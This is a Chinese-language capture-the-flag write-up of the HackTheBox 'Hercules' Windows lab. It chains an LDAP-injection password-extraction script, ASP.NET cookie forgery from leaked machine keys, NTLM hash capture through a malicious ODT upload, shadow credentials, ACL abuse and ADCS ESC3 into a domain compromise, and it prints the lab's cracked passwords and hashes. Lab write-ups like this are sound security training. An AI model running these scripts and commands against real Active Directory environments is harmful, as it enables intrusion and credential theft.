---
title: "HTB Hercules"
description: "HackTheBox篇Season 9系列之Hercules"

date: 2025-10-23T15:47:11+08:00
lastmod: 2025-11-11T15:14:11+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - RID Cycling
  - Shadow Credentials
  - ADCS-ESC3
  - RBCD on SPN-less
  - ACL abuse
  - LDAP Injection
  - NTLM Relay
---
<!--more-->

> 靶机ip：10.10.11.91
>
> 感谢lamber师傅提供的大致解题流程
>
> 传送门：https://lamber-maybe.com/hackthebox/machines/hercules/

# 知识点

1. kerberos pre_auth
2. LDAP注入
3. NTLM反射
4. Shadow Credentials 攻击
5. ACL滥用
6. ADCS ESC3
7. 基于资源的约束性委派

# 信息收集

```rustscan
Open 10.10.11.91:53
Open 10.10.11.91:80
Open 10.10.11.91:88
Open 10.10.11.91:135
Open 10.10.11.91:139
Open 10.10.11.91:389
Open 10.10.11.91:443
Open 10.10.11.91:445
Open 10.10.11.91:464
Open 10.10.11.91:593
Open 10.10.11.91:636
Open 10.10.11.91:3268
Open 10.10.11.91:3269
Open 10.10.11.91:5986
Open 10.10.11.91:9389
Open 10.10.11.91:49664
Open 10.10.11.91:49667
Open 10.10.11.91:49674
Open 10.10.11.91:49684
Open 10.10.11.91:56252
Open 10.10.11.91:56272
Open 10.10.11.91:64047
```

# Web渗透

## 枚举用户名

页面没有任何信息，扫目录只有login，只能先枚举用户名

先生成字典

```shell
awk '/^[[:space:]]*$/ {next} {
    gsub(/^[ \t]+|[ \t]+$/,"");
    for(i=97;i<=122;i++)
        printf "%s.%c\n", $0, i
}' /usr/share/seclists/Usernames/Names/names.txt | \
sudo tee /usr/share/seclists/Usernames/Names/names.withletters.txt > /dev/null && \
echo "Created: /usr/share/seclists/Usernames/Names/names.withletters.txt"
```

利用`kerberos pre_auth`进行用户名枚举，`fuzz`下有哪些域用户

```shell
kerbrute userenum --dc 10.10.11.91 -d hercules.htb '/usr/share/secLists/Usernames/Names/names.withletters.txt' -t 100 
```

![image-20251103104807089](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103104810617-1271838760.png)

保存用户名到`users.txt`

```shell
cat output.txt | awk -F ' ' '{print $7}' | awk -F '@' '{print $1}' > users.txt
```

## LDAP注入

https://brightsec.com/blog/ldap-injection/

```python
#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"

# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

# All enumerated users (replaced as requested)
KNOWN_USERS = [
    "adriana.i",
    "angelo.o",
    "ashley.b",
    "bob.w",
    "camilla.b",
    "clarissa.c",
    "elijah.m",
    "fiona.c",
    "harris.d",
    "heather.s",
    "jacob.b",
    "jennifer.a",
    "jessica.e",
    "joel.c",
    "johanna.f",
    "johnathan.j",
    "ken.w",
    "mark.s",
    "mikayla.a",
    "natalie.a",
    "nate.h",
    "patrick.s",
    "ramona.l",
    "ray.n",
    "rene.s",
    "shae.j",
    "stephanie.w",
    "stephen.m",
    "tanya.r",
    "tish.c",
    "vincent.g",
    "will.s",
    "zeke.s",
    "auditor"
]

def get_token_and_cookie(session):
    """Get fresh CSRF token and cookies"""
    response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)
    token = None
    match = TOKEN_RE.search(response.text)
    if match:
        token = match.group(1)
    return token

def test_ldap_injection(username, description_prefix=""):
    """Test if description starts with given prefix using LDAP injection"""
    session = requests.Session()
    
    # Get fresh token
    token = get_token_and_cookie(session)
    if not token:
        return False
    
    # Build LDAP injection payload
    if description_prefix:
        # Escape special characters
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        payload = f"{username}*)(description={escaped_desc}*"
    else:
        # Check if user has description field
        payload = f"{username}*)(description=*"
    
    # Double URL encode
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
    
    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }
    
    try:
        response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        return False

def enumerate_description(username):
    """Enumerate description/password field character by character"""
    # Character set - most common password chars first for optimization
    charset = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "!@#$_*-." +  # Common special chars
        "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common
    )
    
    print(f"\n[*] Checking user: {username}")
    
    # First check if user has description
    if not test_ldap_injection(username):
        print(f"[-] User {username} has no description field")
        return None
    
    print(f"[+] User {username} has a description field, enumerating...")
    description = ""
    max_length = 50
    no_char_count = 0
    
    for position in range(max_length):
        found = False
        for char in charset:
            test_desc = description + char
            if test_ldap_injection(username, test_desc):
                description += char
                print(f"  Position {position}: '{char}' -> Current: {description}")
                found = True
                no_char_count = 0
                break
            # Small delay to avoid rate limiting
            time.sleep(0.01)
        
        if not found:
            no_char_count += 1
            if no_char_count >= 2:  # Stop after 2 positions with no chars
                break
    
    if description:
        print(f"[+] Complete: {username} => {description}")
        return description
    return None

def main():
    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Testing {len(KNOWN_USERS)} users")
    print("="*60)
    
    found_passwords = {}
    
    # Priority users to test first
    priority_users = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
    other_users = [u for u in KNOWN_USERS if u not in priority_users]
    
    # Test priority users first
    for user in priority_users + other_users:
        password = enumerate_description(user)
        if password:
            found_passwords[user] = password
            # Save results immediately
            with open("hercules_passwords.txt", "a") as f:
                f.write(f"{user}:{password}\n")
            print(f"\n[+] FOUND: {user}:{password}\n")
    
    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)
    
    if found_passwords:
        print(f"\nFound {len(found_passwords)} passwords:")
        for user, pwd in found_passwords.items():
            print(f"  {user}: {pwd}")
    else:
        print("\nNo passwords found")

if __name__ == "__main__":
    main()
```

![image-20251103110531768](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103110535000-1258202512.png)

```shell
johnathan.j:change*th1s_p@ssw()rd!!
```

但是还是登录不上web后台，尝试密码喷洒

```shell
nxc ldap 10.10.11.91 -u users.txt  -p 'change*th1s_p@ssw()rd!!' -k
```

![image-20251103111207434](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103111210403-1510336064.png)

注意到`ken.w`用户的报错是时间差，用这个用户登录

```shell
ken.w:change*th1s_p@ssw()rd!!
```

发现有下载文件和上传文件两个功能可能被利用

## 任意文件读取+Cookie伪造越权

先看下载，抓包看一下

![image-20251103134808866](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103134812676-1619266896.png)

之前可以看出这是个`.net`网站，所以重点文件找`web.config`

```shell
../../web.config

发现：
decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
validation="HMACSHA256"
validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F
9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
```

> decryptionKey是ASP.NET用来加密机密数据（例如Forms-Auth票证或ViewState）的对称密钥-通常使用类似AES的块密码。
>
> validationKey是用于计算/验证MAC（例如HMAC-SHA 256）的完整性密钥，因此服务器可以检测篡改。
>
> 如果知道这两个密钥，他们可以制作一个paylaod，用decryptionKey加密它，并用validationKey生成一个有效的MAC；就可以伪造任何帐户（包括管理员）

创建一个表单获取`admin`的`cookie`

```shell
# 创建一个新的控制台项目
dotnet new console -o LegacyAuthConsole

# 添加版本为v2.0.5的AspNetCore.LegacyAuthCookieCompat 包
cd LegacyAuthConsole
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5

# 把项目需要的包全部下载好
dotnet restore

# 将目录下的Program.cs改成以下代码
```

```c#
using System;
using System.Security.Claims;
using System.Threading.Tasks;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey = 
"EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

        string decryptionKey = 
"B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);
        var formsAuthenticationTicket = new FormsAuthenticationTicket(1, "web_admin", 
issueDate, expiryDate, false, "Web Administrators", "/");

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var legacyFormsAuthenticationTicketEncryptor = new 
LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, 
ShaVersion.Sha256);

        var encryptedText = 
legacyFormsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);

        Console.WriteLine(encryptedText);
    }
}
```

```shell
# 编译
dotnet build

# 运行当前 .NET 项目
dotnet run
```

![image-20251103140526092](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140529258-1074315152.png)

```cookie
9FF91A4D1B8F282E233170312372B975306FF0061E88B768F7A899EF59F6E0A0BD7B7A4F3738047F1C64C05A56C37265F22AADE6C5DB9203AC15E68DE5273AA5C514088384BCC3413792DFD9B34275AFACBAD3B7BABA7DBB945CE4E02EE6BB87676DDDC221C90DD60FF6070EDC19FE00C59AECF51F90CDA5C4752B5E7772C03AEAEB62D0D6280B72ADF83C64F857A81B089F4EF9791C29FE97427BAED6242C512572E2CF34CFA462541661185AAED93CB9C6BB60FC56B4955F27E1C8543A2AAC
```

登录`ken.w`把上面的`cookie`换一下即可

成功切换到`web admin`

![image-20251103140657822](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140701370-87310252.png)

![image-20251103140744510](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140747376-1048162703.png)

发现仅让管理员上传文件（`FUZZ`后发现可以上传`.odt`和`.docx`）

## 文件上传+NTLM反射

参考：https://github.com/lof1sec/Bad-ODF

用这个脚本生成恶意的odt文件

![image-20251103142422778](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142425840-1002063500.png)

监听

```shell
sudo responder -I tun0 -v
```

![image-20251103142553632](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142556850-513730375.png)

```hash
natalie.a::HERCULES:14c4381d2aded8fb:D26947A2D68515048A6352FE7154295A:010100000000000000D1C6AA604CDC01F2FBC445EC5286B50000000002000800320056004200490001001E00570049004E002D004C003900520056005000470032004800570055004C0004003400570049004E002D004C003900520056005000470032004800570055004C002E0032005600420049002E004C004F00430041004C000300140032005600420049002E004C004F00430041004C000500140032005600420049002E004C004F00430041004C000700080000D1C6AA604CDC010600040002000000080030003000000000000000000000000020000049C996027345DCB01B7A07074E2C570885C6F4D9502CB19ACBE777F8558A84560A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
```

破解

![image-20251103142739441](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142742374-1223977382.png)

```text
Prettyprincess123! (natalie.a)
```

# 域信息收集+分析

进行信息收集

```shell
bloodhound-python -u natalie.a -p 'Prettyprincess123!' -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap 
```

分析`natalie.a`，发现可以通过`GenericWrite`来横移到`bob.w`

![image-20251103153244355](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103153247572-444159897.png)

再看看哪些用户属于远程登录的组：

![image-20251103151713588](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103151716470-1427368928.png)

`auditor`和`ashley.b`属于

并且又看到`stephen.m`和`mark.s`属于`Security Helpdesk`组，然后`Security Helpdesk`组对`auditor`有`forcechangepassword`权限

![image-20251103152812713](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103152816288-1230137721.png)

分析得知，我们需要得到`Security Helpdesk`组成员中的任意一个凭据，然后通过`ForceChangePassword`权限更改`auditor`的密码，从而远程登陆

但是发现`bob.w`和`Security Helpdesk`组成员没有任何联系，只能先横移过去在检查有没有其他方法了

利用`Genericwrite`权限来用影子证书来打`bob.w`

# Shadow Credentials 攻击

先请求`natalie.a`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'natalie.a':'Prettyprincess123!' -dc-ip 10.10.11.91
```

![image-20251103160646021](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103160650089-575334185.png)

导入票据

```shell
export KRB5CCNAME=natalie.a.ccache
```

攻击

```shell
certipy-ad shadow auto -u natalie.a@hercules.htb -p 'Prettyprincess123!' -k -account bob.w -target dc.hercules.htb
```

![image-20251103160906039](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103160909351-1379874826.png)

拿到`bob.w`的`hash`

```hash
8a65c74e8f0073babbfac6725c66cc3f
```

# ACL滥用

现在目标是让`bob.w`和`Security Helpdesk`组成员产生联系，用`bloodyAD`检查下`bob.w`的可写权限

先请求`bob.w`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'bob.w' -hashes :8a65c74e8f0073babbfac6725c66cc3f -dc-ip 10.10.11.91
```

![image-20251103164923135](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103164926169-632850484.png)

导入票据

```shell
export KRB5CCNAME=bob.w.ccache
```

攻击

```shell
bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' --host DC.hercules.htb get writable
```

![image-20251103165150017](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165153479-143466543.png)

可以将`stephen.m`从`Security Department OU` 移动到 `Web Department OU`

用`powerview`以`bob.w`的票据枚举域内的信息

```shell
powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass

Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

![image-20251103165432623](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165435839-896519048.png)

如果你想的话，移动`mark.s`也是可以的，重新`bloodhound`收集分析就会发现`natalie.a`到`stephen.m`有路线了，最开始是没有的

![image-20251103165812403](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165815304-1558805333.png)

同样的方法打影子凭证

先请求`natalie.a`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'natalie.a':'Prettyprincess123!' -dc-ip 10.10.11.91
```

![image-20251103170108796](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103170113195-272871400.png)

导入票据

```shell
export KRB5CCNAME=natalie.a.ccache
```

攻击

```shell
certipy-ad shadow auto -u natalie.a@hercules.htb -p 'Prettyprincess123!' -k -account stephen.m -target dc.hercules.htb
```

![image-20251103170956808](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103170959969-151986217.png)

拿到`stephen.m`的`hash`

```hash
9aaaedcb19e612216a2dac9badb3c210
```

**PS: 出现这种报错的，多半是`powerview`退出来了，重新执行，别退出来再攻击就可以了**

![image-20251103171049673](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171053299-619397510.png)

接下来就可以通过该用户利用`forcechangepassword`权限修改`auditor`的密码，从而远程登录了

# 修改Auditor密码

先请求`stephen.m`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'stephen.m' -hashes :9aaaedcb19e612216a2dac9badb3c210 -dc-ip 10.10.11.91
```

![image-20251103171457518](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171500733-1894801610.png)

导入票据

```shell
export KRB5CCNAME=stephen.m.ccache
```

修改密码

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb  -u stephen.m -k set password auditor 'Aa123456!'
```

![image-20251103171639019](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171641868-727241330.png)

# 远程登陆 auditor+user.txt

kali自带的`evil-winrm`不好使，在github找一个

工具：https://github.com/ozelis/winrmexec

先请求`auditor`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'auditor':'Aa123456!'  -dc-ip 10.10.11.91
```

![image-20251103172631130](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172634277-1876491255.png)

导入票据

```shell
export KRB5CCNAME=auditor.ccache
```

登录

```shell
python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

![image-20251103172721724](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172725023-1397425410.png)

![image-20251103172748484](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172751379-139090495.png)

拿到`user.txt`

# 机器信息收集

![image-20251104104310690](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104104316979-1099720881.png)

发现我们当前是`Forest Management`组的成员，查看一下这个组对哪个OU有权限，方便后续操作

```powershell
(Get-ADOrganizationalUnit -Filter * | % { $acl=(Get-Acl "AD:$($_.DistinguishedName)").Access | ? {$_.IdentityReference -like "*Forest Management*"}; if($acl){ "$($_.Name): $($acl.
ActiveDirectoryRights -join ', ')" } }) -join "`n"
```

![image-20251104140402752](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104140408598-336855357.png)

发现对`Forest Migration OU`有`GenericAll`权限，所以我们依然可以用前面的方法，通过改密码获取这个`OU`里用户的凭据

再查看一下这个`OU`的用户有哪些

![image-20251105165559644](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105165606955-569279037.png)

发现有个`iis_administrator`用户，记录一下先

![image-20251104141446929](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104141452403-658517656.png)

在`bloodhound`发现只有`fernando.r`在`SMARTCARD OPERATORS`组里

![image-20251104142136265](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104142141620-1879081520.png)

同时注意到这个组是一个证书管理组，还是比较有利用价值的，所以现在的目标是获取到`fernando.r`用户的凭据，然后尝试下ADCS

# 更改fernando.r密码

将`Auditor`的`OU`改成`Forest Migration`中

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p 'Aa123456!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

![image-20251104143028212](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104143033568-2017186545.png)

在给`Forest Migration OU`一个`GenericAll`权限

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p 'Aa123456!' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

![image-20251104143523788](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104143528943-382514929.png)

现在就可以准备横移了，先检查下`fernando.r`

```shell
Get-ADUser -Identity "Fernando.R"
```

![image-20251104144046957](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104144052500-2061575013.png)

先启用一下该用户

```shell
bloodyAD --host dc.hercules.htb -d 'hercules.htb' -u 'auditor' -p 'Aa123456!' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
```

![image-20251104153126050](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153131459-9200239.png)

![image-20251104153139346](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153144615-612573370.png)

发现已经启用了，接下来就可以直接改密码

改密码

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'Aa123456!'
```

![image-20251104153309351](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153314576-561611725.png)

# ADCS ESC3证书攻击

先申请票据

```shell
impacket-getTGT 'hercules.htb'/'fernando.r':'Aa123456!' -dc-ip 10.10.11.91
```

![image-20251104153513097](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153518468-727815363.png)

导入票据

```shell
export KRB5CCNAME=fernando.r.ccache
```

扫描一下有无可以利用证书

```shell
certipy-ad find -k -no-pass -dc-ip 10.10.11.91 -target dc.hercules.htb  -stdout -vulnerable 
```

![image-20251104153949648](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153955178-1870192044.png)

发现可以利用[ECS3](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-certificate-agent-eku)

![image-20251104160356232](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104160401666-1809661416.png)

申请证书

```shell
certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' -template 'EnrollmentAgent'
```

![image-20251104161121765](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104161127116-504577464.png)

# RBCD

接下来用这个证书请求允许代表另一个用户的证书，最开始分析只有两个用户可以远程登陆，我们已经成功登录其中一个用户了，现在去请求另一个可以远程登陆的用户`ashley.b`

![image-20251104162709056](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104162714533-2052894244.png)

```shell
certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip "10.10.11.91" -target "dc.hercules.htb" -ca 'CA-HERCULES' -template 'User' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom
```

如果出现如下报错，多半是`fernando.r`用户又恢复禁止状态了，重新启用一下该用户即可

![image-20251104163247257](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163304466-2051333946.png)

重新执行申请`ashley.b`证书的操作

![image-20251104163703898](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163709292-1180713750.png)

通过这个证书获取hash来远程登陆

```shell
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
```

![image-20251104163948052](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163953632-1154822052.png)

```hash
:1e719fbfddd226da74f644eac9df7fd2
```

# 远程登陆 ashley.b

申请TGT：

```shell
impacket-getTGT 'hercules.htb'/'ashley.b'  -hashes :1e719fbfddd226da74f644eac9df7fd2 -dc-ip 10.10.11.91
```

![image-20251104164244386](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104164249745-88874379.png)

导入票据

```shell
export KRB5CCNAME=ashley.b.ccache
```

登录

```shell
python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

![image-20251104164353536](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104164358850-563623805.png)

发现桌面只有一个ps脚本和Mail目录，Mail下还有个RE_ashley.eml文件

* Mail/RE_ashley.eml

```eml
PS C:\Users\ashley.b\Desktop\Mail> type RE_ashley.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"
--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
Hello Ashley,
The issue you are facing is that some members in the Department were once p=
art of sensitive groups which are blocking your permissions.
I've discussed your issue at length with security and here is a solution th=
at we feel works for both us and your team. I've attached a copy of the scr=
ipt your team should run to your home folder. For convenience, We have prov=
ided a shortcut to the script in the IT share. You may also run the task ma=
nually from powershell.
If you have any other issues feel free to inform me.
Regards, Domain Admins.
________________________________
From: Ashley Browne
Sent: Monday 09:49:37 AM
To: Domain Admins <Administrator@HERCULES.HTB>
Subject: Unable to reset user's password.
Good Morning,
Today one of my staff received a password reset request from a user, but fo=
r some reason they were unable to perform the action due to invalid permiss=
ions. I have double checked against another user and confirmed our team has=
permission to handle password changes in the department the user belongs to=
. I was told to contact you for further assistance.
For reference the user is "will.s" from the "Engineering Department" Unit.
I look forward to your reply.
Regards, Ashley.
--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

大致内容如下：

![image-20251104165016119](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104165021528-11826276.png)

大概内容就是执行ps脚本来重置密码

* aCleanup.ps1

 ```powershell
PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
 ```

文件中还提到了IT共享，查看一下

![image-20251104170848503](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104170854641-1344981353.png)

![image-20251105103343492](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105103350446-540474626.png)

在这个文件夹里又找到个ps脚本

```powershell
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}
function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}
function CleanArtifacts {
    param($Object)
    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}
$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""
foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName
        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            } 
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
```

这个脚本遍历指定 OU 中 `IT Support` 组可重置密码的对象，并对其下所有子对象 清除 adminCount 属性并启用 ACL 继承，以清理高权限账户的残留痕迹，目前好像没什么可以继续利用的了。

从之前的结果中可以发现，在`Forest Migration OU`里的用户还有`iis_administrator`

![image-20251105105015194](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105105021695-1100375388.png)

但是我在bloodhound上并没有搜到这个用户，可能没有收集全，重新用`auditor`收集一下

```shell
bloodhound-python -u auditor -p 'Aa123456!' -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap
```

![image-20251105111042187](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105111048861-1091868681.png)

这回没问题了，发现`iis_administrator`属于`SERVICE OPERATORS`组，而且这个组可以强制改`IIS_WEBSERVER$`用户的密码，同时注意到`IIS_WEBSERVER$`还是个机器账户，后续怎么用后面再说

# 更改IIS_WEBSERVER$密码

**先重置`iis_administrator`的密码**

用`auditor`给`IT SUPPORT`一个`GenericAll`权限

```shell
bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
```

![image-20251105112034328](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105112040991-1970466169.png)

再给`auditor`一个`GenericAll`权限

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p 'Aa123456!' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

![image-20251105112144648](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105112150743-1050666770.png)

然后启用`iis_administrator`用户

```shell
bloodyAD --host dc.hercules.htb -d 'hercules.htb' -u 'auditor' -p 'Aa123456!' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE
```

![image-20251105140337346](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140343975-1200485803.png)

**PS: 如果出现权限不足的情况，需要先执行下ps脚本`.\aCleanup.ps1`然后重新执行一遍这三条命令**

 验证一下

```powershell
Get-ADUser -Identity "iis_administrator"
```

![image-20251105140606757](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140613159-341457701.png)

接下来就可以直接改密码了

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k set password 'iis_administrator' 'Aa123456!'
```

